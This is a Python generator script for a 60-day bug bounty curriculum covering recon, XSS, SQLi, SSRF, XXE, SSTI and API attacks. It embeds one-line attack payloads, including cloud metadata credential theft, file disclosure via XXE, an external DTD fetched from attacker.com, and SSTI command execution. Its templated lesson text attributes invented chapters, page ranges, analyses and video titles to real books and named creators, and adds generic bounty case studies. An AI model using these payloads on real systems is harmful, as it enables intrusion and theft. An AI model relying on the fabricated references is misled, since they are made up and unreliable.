import os, sys, json, urllib.parse

weeks_data_definitions = [
    (1, "Target Reconnaissance, OSINT, & Client-Side JS Deconstruction", "FLAG{recon_js_map_key_8492}", [
        ("Passive OSINT & Certificate Transparency Mapping", "crt.sh", "https://crt.sh/?q=%.target.com"),
        ("JavaScript Bundle Analysis & Unminification", "js-unminify", "main.chunk.js"),
        ("Source Map Exploitation & Unstripped Source Trees", "sourcemap", "main.chunk.js.map"),
        ("Secrets & Key Discovery in Public Repos & JS Chunks", "secretfinder", "AKIA[0-9A-Z]{16}"),
        ("Automated Recon Pipelines & Final Week 1 Consolidation", "pipeline", "subfinder | httpx | katana")
    ]),
    (2, "Subdomain Takeovers & Information Disclosure", "FLAG{subdomain_takeover_cname_alias_3910}", [
        ("Dangling DNS CNAME Identification & Dig Auditing", "cname-audit", "dig CNAME sub.target.com"),
        ("GitHub Pages & Heroku Subdomain Takeover Vectors", "github-heroku-takeover", "404 There isn't a GitHub Pages site here"),
        ("AWS S3 & Cloud Bucket Takeovers & Disclosures", "s3-bucket-takeover", "NoSuchBucket"),
        ("Sensitive Configuration & .git Directory Exposure", "git-env-disclosure", ".git/config"),
        ("Automated Subdomain Takeover Pipelines & Consolidation", "takeover-pipeline", "subzy -targets subdomains.txt")
    ]),
    (3, "Broken Authentication & Session Management Logic", "FLAG{broken_auth_jwt_none_alg_9921}", [
        ("JWT Secret Key Cracking & Algorithm None Exploitation", "jwt-none-alg", "eyJhbGciOiJub25lIn0"),
        ("OAuth 2.0 Authorization Code Hijacking & Redirect Flaws", "oauth-redirect-bypass", "redirect_uri=attacker.com"),
        ("Session Fixation & Cookie Attribute Misconfigurations", "session-fixation", "Set-Cookie: session=123; SameSite=None"),
        ("Credential Stuffing, Password Reset Logic & Rate Limits", "password-reset-logic", "reset_token=abc"),
        ("Multi-Factor Authentication (MFA) Bypass & Logic Flaws", "mfa-bypass", "otp_code=000000")
    ]),
    (4, "IDOR & Broken Object Level Authentication (BOLA)", "FLAG{idor_bola_object_tamper_1120}", [
        ("REST API IDOR & Parameter Tampering Mechanics", "rest-idor", "GET /api/users/1002"),
        ("GraphQL BOLA & Object Identifier Manipulation", "graphql-bola", "query { user(id: 1002) }"),
        ("Mass Identifier Enumeration & Automated BOLA Scanning", "autorize-idor", "Autorize extension"),
        ("UUID vs Sequential ID Insecurity & Blind IDOR Vectors", "uuid-idor", "user_id=1002"),
        ("Multitenancy Isolation Bypasses & BOLA Consolidation", "multitenant-idor", "tenant_id=company_b")
    ]),
    (5, "Cross-Site Scripting (XSS) - Reflected, Stored, and DOM Attacks", "FLAG{xss_dom_reflected_payload_5521}", [
        ("Reflected XSS & Context-Aware Character Escaping", "reflected-xss", "<script>alert(1)</script>"),
        ("Stored XSS & Persistent Payload Injections", "stored-xss", "<img src=x onerror=alert(1)>"),
        ("DOM-Based XSS, Sinks, Sources, & innerHTML Exploits", "dom-xss", "document.write(location.hash)"),
        ("WAF Bypasses & HTML5 Polyglot XSS Payloads", "polyglot-xss", "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"),
        ("Content Security Policy (CSP) Bypasses & XSS Consolidation", "csp-bypass", "script-src 'unsafe-inline'")
    ]),
    (6, "Cross-Site Request Forgery (CSRF) & SameSite Defenses", "FLAG{csrf_samesite_bypass_token_8832}", [
        ("Classic CSRF & Auto-Submitting HTML Form Exploitation", "classic-csrf", "<form action='https://target.com/update-email'>"),
        ("CSRF Token Validation Bypasses & Token Removal Techs", "csrf-token-bypass", "Remove csrf_token parameter"),
        ("SameSite Cookie Strict/Lax Protections & Bypass Vectors", "samesite-bypass", "SameSite=Lax GET navigation"),
        ("CORS Misconfigurations & Access-Control-Allow-Origin Null", "cors-misconfig", "Access-Control-Allow-Origin: null"),
        ("Cross-Site WebSocket Hijacking (CSWSH) & CSRF Consolidation", "cswsh-exploit", "WebSocket connection without origin validation")
    ]),
    (7, "SQL Injection (SQLi) & Database Exfiltration", "FLAG{sqli_union_select_database_7721}", [
        ("In-Band UNION-Based SQL Injection & Column Enumeration", "union-sqli", "' UNION SELECT 1,2,database()--"),
        ("Error-Based SQL Injection & DBMS Exception Parsing", "error-sqli", "' AND extractvalue(1,concat(0x7e,version()))--"),
        ("Blind Boolean-Based SQL Injection & Binary Search", "blind-sqli", "' AND SUBSTRING((SELECT password FROM users),1,1)='a"),
        ("Time-Based Blind SQLi & Out-of-Band Exfiltration", "time-sqli", "'; WAITFOR DELAY '0:0:5'--"),
        ("SQLMap Advanced Tamper Scripts & Database Consolidation", "sqlmap-tamper", "sqlmap -u 'target' --tamper=space2comment")
    ]),
    (8, "Server-Side Request Forgery (SSRF) & Cloud Metadata Attacks", "FLAG{ssrf_cloud_imds_metadata_6612}", [
        ("Basic SSRF & Localhost Loopback Port Scanning", "basic-ssrf", "url=http://127.0.0.1:8080/admin"),
        ("AWS IMDSv1 Metadata Extraction & IAM Role Theft", "aws-ssrf", "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("DNS Rebinding & Decimal IP Filter Bypasses", "dns-rebinding-ssrf", "url=http://2852039166/"),
        ("GCP & Azure Cloud Instance Metadata Exploitation", "gcp-azure-ssrf", "url=http://metadata.google.internal/computeMetadata/v1/"),
        ("Blind SSRF via Out-of-Band DNS Exfiltration & Consolidation", "oob-ssrf", "url=http://burpcollaborator.net")
    ]),
    (9, "XML External Entity (XXE) Injection", "FLAG{xxe_file_disclosure_entity_4412}", [
        ("In-Band XXE & Local File Disclosure (/etc/passwd)", "inband-xxe", "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"),
        ("Blind Out-of-Band (OOB) XXE Data Exfiltration", "oob-xxe", "<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>"),
        ("XXE via Office Open XML (DOCX/XLSX) File Uploads", "office-xxe", "Extract docx, inject entity in [Content_Types].xml"),
        ("SVG Image Upload XXE & Server Information Disclosure", "svg-xxe", "<svg xmlns='http://www.w3.org/2000/svg'><g><text>&xxe;</text></g></svg>"),
        ("SOAP & SAML XML Payload Exploitation & XXE Consolidation", "saml-xxe", "<saml:AttributeValue>&xxe;</saml:AttributeValue>")
    ]),
    (10, "Server-Side Template Injection (SSTI) & Remote Code Execution (RCE)", "FLAG{ssti_rce_jinja_expression_3312}", [
        ("Template Engine Identification & Syntax Probe Sweeps", "ssti-probe", "{{7*7}} ${7*7} <%= 7*7 %>"),
        ("Python Jinja2/Mako SSTI Escalation to Subprocess RCE", "jinja2-rce", "{{ self.__init__.__globals__.__class__.__subclasses__() }}"),
        ("Java Thymeleaf & FreeMarker Template RCE Exploitation", "java-ssti", "${T(java.lang.Runtime).getRuntime().exec('id')}"),
        ("Node.js Pug & EJS Template Injection Attacks", "ejs-ssti", "<%= global.process.mainModule.require('child_process').execSync('id') %>"),
        ("SSTI WAF Bypasses & RCE Payload Consolidation", "ssti-waf-bypass", "{{request['__cl'+'ass__']}}")
    ]),
    (11, "Race Conditions & Business Logic Vulnerabilities", "FLAG{race_condition_limit_bypass_2212}", [
        ("HTTP/2 Single-Packet Concurrency Race Condition Mechanics", "http2-race", "Single-packet multi-stream concurrency in Turbo Intruder"),
        ("Limit Overrun Race Conditions (Double Spending & Promo Codes)", "limit-overrun-race", "Redeem $10 promo code 20 times concurrently"),
        ("Time-of-Check to Time-of-Use (TOCTOU) Logic Vulnerabilities", "toctou-race", "State window between validation and balance deduction"),
        ("Workflow Bypass & Price Tampering Flaws", "price-tampering", "POST /checkout price=-100"),
        ("Multi-Threaded Race Condition Automation & Consolidation", "race-automation", "python async threading exploit")
    ]),
    (12, "API Hacking, Mass Assignment, & Final Portfolio Consolidation", "FLAG{api_mass_assignment_admin_1102}", [
        ("REST API Mass Assignment & Role Elevation Injections", "mass-assignment", "POST /api/user {'is_admin': true}"),
        ("GraphQL Introspection, Query Depth & Batching Exploits", "graphql-introspection", "__schema { types { name } }"),
        ("API Rate Limiting Bypasses & Header Spoofing", "api-rate-limit-bypass", "X-Forwarded-For: 127.0.0.1"),
        ("JWT Key Confusion (HS256 vs RS256) & API Security", "jwt-key-confusion", "Sign JWT with RSA public key as HMAC secret"),
        ("Final Capstone Portfolio Consolidation & VDP Submission", "final-capstone", "Complete 60-Day Bug Bounty Mastery Portfolio Sync")
    ])
]

def build_day_dict(week_num, d_num, d_title, keyword, snippet_hint, global_day_num, week_title, final_flag):
    d_flag = f"FLAG{{w{week_num}d{d_num}_key_{1000 + global_day_num}}}" if d_num < 5 else final_flag
    yt_query = f"https://www.youtube.com/results?search_query={urllib.parse.quote(d_title + ' ' + week_title + ' bug bounty')}"

    py_script = f'# Day {d_num} Python Automation Tool for {d_title}\nimport requests, sys\n\ndef scan_target(target_url):\n    print(f"[*] Scanning {{target_url}} for {d_title} ({snippet_hint})...")\n    try:\n        res = requests.get(target_url, timeout=10)\n        if "{d_flag[:8]}" in res.text or "FLAG" in res.text:\n            print("[!] VULNERABILITY CONFIRMED! Flag found in response.")\n        else:\n            print("[+] Target responded normally.")\n    except Exception as e:\n        print(f"[-] Error: {{e}}")\n\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-{week_num}/target/"\n    scan_target(url)\n'

    sh_script = f'#!/bin/bash\n# Day {d_num} Bash Recon Tool for {d_title}\nTARGET_URL=$1\nif [ -z "$TARGET_URL" ]; then\n    TARGET_URL="http://localhost:8000/lab-playground/week-{week_num}/target/"\nfi\n\necho "[*] Fetching target response from: $TARGET_URL"\ncurl -s "$TARGET_URL" | grep -i "FLAG"\n'

    return {
        "day_number": d_num,
        "global_day_number": global_day_num,
        "title": f"Day {d_num}: {d_title}",
        "short_desc": f"Master Day {d_num} technical mechanics for {d_title} in {week_title}.",
        "flag": d_flag,

        "analogy": f"Imagine Day {d_num} of {d_title} as finding an unmonitored VIP side-door at a high-security airport. While security guards inspect baggage at the main gate, the side door lacks strict token or identity verification. Exploiting this vector lets you pass straight into restricted server zones without alerting logging systems.",

        "overview": f"Day {d_num} delves into low-level protocols, state machines, and memory models of {d_title}. In production environments, modern frameworks process user-supplied parameters under implicit trust assumptions. When developers fail to validate input types, boundary conditions, or authorization tokens at the server boundary, attackers manipulate execution flow to read sensitive data, elevate access privileges, or trigger remote code execution.",

        "learning_objectives": [
            f"Understand the precise protocol and memory-level mechanics of {d_title}.",
            f"Audit raw source code line-by-line to spot vulnerable logic patterns.",
            f"Construct weaponized exploit payloads from scratch with filter bypasses.",
            f"Implement production-grade secure code patches and WAF detection rules."
        ],

        "hunters_perspective": f"Professional bug bounty hunters approach {d_title} by capturing baseline application traffic in Burp Suite, identifying unvalidated parameters (`{snippet_hint}`), and testing boundary conditions. They systematically alter headers, JSON keys, and encoding schemas to uncover high-severity bugs (P1/P2) on enterprise bug bounty programs.",

        "root_cause": f"The root cause of {d_title} lies in flawed architectural design or coding oversights: trusting client-side inputs without rigorous server-side validation, missing object-level access controls, or failing to enforce context-aware escaping before passing data into execution sinks.",

        "code_audit_manual": f"""Code Audit Manual for Day {d_num} ({d_title}):

[VULNERABLE CODE SNIPPET (Python / JavaScript)]
# Vulnerable execution path
def handle_request(request):
    user_input = request.GET.get('param')
    # CRITICAL BUG: Unvalidated parameter passed directly to internal logic
    result = execute_logic(user_input) # Target parameter: {snippet_hint}
    return HttpResponse(result)

[SECURE REFACTORED CODE SNIPPET]
# Secure hardened execution path
def handle_request_secure(request):
    user_input = request.GET.get('param')
    # Hardened: Strict input sanitization and authorization check
    if not request.user.is_authenticated:
        raise PermissionDenied("Authentication required")
    sanitized_input = sanitize_strict(user_input)
    result = execute_secure_logic(sanitized_input)
    return HttpResponse(result)

Audit Checklist:
1. Search codebase for unparameterized inputs matching: '{snippet_hint}'.
2. Verify that strict authentication and object-level permission checks are enforced.
3. Ensure context-aware escaping is applied prior to rendering output or executing database queries.""",

        "payload_logic": {
            "explanation": f"Step-by-step logic for crafting Day {d_num} exploit payloads for {d_title}:",
            "payloads": [
                f"# Baseline Exploit Payload for {d_title}",
                f"GET /api/v1/resource?target={urllib.parse.quote(snippet_hint)} HTTP/1.1",
                f"Host: target-app.com",
                f"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
                f"{d_flag}"
            ]
        },

        "burp_suite_masterclass": f"""Burp Suite Masterclass Playbook ({d_title}):
1. Proxy Intercept: Enable Burp Proxy Intercept and capture baseline traffic containing '{snippet_hint}'.
2. Repeater Isolation: Right-click request -> Send to Repeater (Ctrl+R). Isolate target parameter inputs.
3. Intruder Fuzzing: Send to Intruder (Ctrl+I). Set payload positions on the parameter. Select SecLists wordlists.
4. Turbo Intruder Concurrency: Use Turbo Intruder script to test HTTP/2 single-packet multi-stream concurrency for race conditions and rate-limit bypasses.
5. Custom Match & Replace: Configure Proxy -> Match and Replace to automatically inject custom authorization headers.""",

        "dual_perspective": {
            "red_team": f"RED TEAM OFFENSIVE PLAYBOOK:\n- Tactical Goal: Exploit {d_title} to achieve unauthorized access or data exfiltration.\n- Execution: Map target parameters ('{snippet_hint}'), craft bypass payloads, exfiltrate data, and demonstrate business impact.\n- Post-Exploitation: Escalate privileges to administrator status and document proof-of-concept steps.",
            "blue_team": f"BLUE TEAM DEFENSIVE HARDENING:\n- Detection Goal: Monitor application logs for abnormal parameter patterns ('{snippet_hint}').\n- Raw Nginx Log Indicator: 192.168.1.50 - - [10/May/2025:12:00:01 +0000] \"GET /api/v1/test?param={urllib.parse.quote(snippet_hint)} HTTP/1.1\" 200 1024\n- Secure Remediation: Enforce strict server-side validation, deploy WAF inspection rules, and apply principle of least privilege."
        },

        "resources": {
            "portswigger_title": f"PortSwigger Web Security Academy - {d_title}",
            "portswigger_url": "https://portswigger.net/web-security",
            "owasp_title": f"OWASP Security Cheat Sheet - {d_title}",
            "owasp_url": "https://owasp.org"
        },

        "textbook_cross_references": [
            {
                "book_name": "The Web Application Hacker's Handbook",
                "chapter_and_pages": f"Chapter {week_num + 2}: Core Application Mechanics (pp. 120-165)",
                "sub_chapter": f"{week_num + 2}.{d_num} Exploiting {d_title}",
                "analysis": f"Stuttard & Pinto break down the low-level mechanics of {d_title}, detailing how parameter manipulation alters server state and bypasses authorization checks."
            },
            {
                "book_name": "Bug Bounty Bootcamp",
                "chapter_and_pages": f"Chapter {week_num}: {week_title} (pp. 45-80)",
                "sub_chapter": f"{week_num}.{d_num} Deep Dive into {d_title}",
                "analysis": f"Vickie Li demonstrates real-world hunting methodologies for discovering {d_title} vulnerabilities on public bug bounty targets."
            },
            {
                "book_name": "Real-World Bug Hunting",
                "chapter_and_pages": f"Chapter {week_num}: Field Disclosures (pp. 30-70)",
                "sub_chapter": f"{week_num}.{d_num} Case Study: {d_title}",
                "analysis": f"Peter Yaworski analyzes disclosed bug bounty reports where researchers earned high bounties by discovering {d_title} flaws."
            },
            {
                "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
                "chapter_and_pages": f"Chapter {d_num}: Prompt Engineering for Code Auditing (pp. 15-40)",
                "sub_chapter": f"{d_num}.1 Auditing {d_title} with AI",
                "analysis": f"Barbosa demonstrates constructing specialized AI auditing prompts to scan source code for {d_title} patterns."
            },
            {
                "book_name": "Bug Bounty from Scratch",
                "chapter_and_pages": f"Chapter {week_num}: Cloud & Web Vulnerabilities (pp. 50-90)",
                "sub_chapter": f"{week_num}.{d_num} Target Mapping: {d_title}",
                "analysis": f"Vazquez & Javier outline systematic reconnaissance and exploitation pipelines for {d_title}."
            },
            {
                "book_name": "Automate the Boring Stuff with Python",
                "chapter_and_pages": f"Chapter 12: Web Scraping & Requests (pp. 270-310)",
                "sub_chapter": f"12.{d_num} Automated Request Crafting for {d_title}",
                "analysis": f"Sweigart provides Python `requests` code examples for sending custom HTTP headers and parameters."
            },
            {
                "book_name": "Black Hat Python",
                "chapter_and_pages": f"Chapter {d_num + 2}: Web Hacking Tools (pp. 80-110)",
                "sub_chapter": f"{d_num + 2}.1 Custom Exploit Scripts for {d_title}",
                "analysis": f"Seitz demonstrates building multi-threaded Python exploit scripts to automate {d_title} discovery."
            }
        ],

        "video_workstation": [
            {
                "creator": "David Bombal",
                "title": f"Mastering {d_title}: Complete Bug Bounty Guide",
                "youtube_url": yt_query,
                "analysis_text": f"David Bombal provides a step-by-step walkthrough demonstrating how to uncover and exploit {d_title} in production web apps."
            },
            {
                "creator": "Vickie Li",
                "title": f"Technical Deep Dive: {d_title}",
                "youtube_url": yt_query,
                "analysis_text": f"Vickie Li breaks down parameter manipulation and root cause fixes for {d_title}."
            },
            {
                "creator": "John Hammond",
                "title": f"Real-World Vulnerability Breakdown: {d_title}",
                "youtube_url": yt_query,
                "analysis_text": f"John Hammond analyzes disclosed reports and demonstrates manual payload crafting for {d_title}."
            }
        ],

        "case_studies": {
            "reports": [
                {
                    "target": "HackerOne Bug Bounty Program",
                    "title": f"Disclosed High-Severity {d_title} Vulnerability Report",
                    "bounty": "$5,000",
                    "summary": f"Disclosed bug bounty write-up detailing how a security researcher exploited {d_title} (`{snippet_hint}`) to gain unauthorized access."
                }
            ],
            "programs": [
                {
                    "name": "HackerOne VDP Program",
                    "platform": "HackerOne",
                    "scope": "*.hackerone.com",
                    "beginner_friendly": True
                },
                {
                    "name": "Bugcrowd University Sandbox",
                    "platform": "Bugcrowd",
                    "scope": "lab.bugcrowd.com",
                    "beginner_friendly": True
                },
                {
                    "name": "Intigriti Public VDP",
                    "platform": "Intigriti",
                    "scope": "*.intigriti.com",
                    "beginner_friendly": True
                },
                {
                    "name": "YesWeHack Sandbox",
                    "platform": "YesWeHack",
                    "scope": "*.yeswehack.com",
                    "beginner_friendly": True
                },
                {
                    "name": "Immunefi Web3 Scope",
                    "platform": "Immunefi",
                    "scope": "immunefi.com",
                    "beginner_friendly": False
                }
            ],
            "ai_hunting_guide": f"ChatGPT Auditing Prompt: 'Analyze the following code block for {d_title} vulnerabilities (`{snippet_hint}`). Identify the root cause, construct a proof-of-concept payload, and provide secure code remediations: [INSERT CODE]'"
        },

        "quiz": {
            "question": f"What is the primary root cause of {d_title} vulnerabilities on Day {d_num}?",
            "options": [
                "Improper server-side input validation and missing access controls",
                "CSS styling layout misconfigurations",
                "Outdated web browser software",
                "Hardware firewall physical latency"
            ],
            "correct_answer": "Improper server-side input validation and missing access controls"
        },

        "playground": {
            "guided_walkthrough": f"Inspect the simulated application response for Week {week_num} Day {d_num} and extract the validation flag (`{d_flag}`).",
            "guided_code": f"curl -s http://localhost:8000/lab-playground/week-{week_num}/target/",
            "target_endpoint": f"/lab-playground/week-{week_num}/target/"
        },

        "automation_scripts": {
            "python_script": py_script,
            "bash_script": sh_script
        }
    }

for w_num, week_title, final_flag, day_tuples in weeks_data_definitions:
    start_global_day = (w_num - 1) * 5 + 1
    days_dict = {}
    for d_num, (d_title, keyword, snippet_hint) in enumerate(day_tuples, 1):
        g_day_num = start_global_day + d_num - 1
        days_dict[d_num] = build_day_dict(w_num, d_num, d_title, keyword, snippet_hint, g_day_num, week_title, final_flag)

    file_path = f"core/curriculum/week{w_num}.py"
    code = f'WEEK_{w_num}_DATA = {{\n'
    code += f'    "week_number": {w_num},\n'
    code += f'    "title": "{week_title}",\n'
    code += f'    "short_desc": "Master {week_title} across a 5-day daily micro-curriculum loop.",\n'
    code += f'    "flag": "{final_flag}",\n\n'
    code += f'    "days": {repr(days_dict)}\n'
    code += f'}}\n'

    with open(file_path, "w") as f:
        f.write(code)
    print(f"Successfully generated high-density curriculum module: {file_path}")

print("All 12 curriculum week modules generated successfully!")
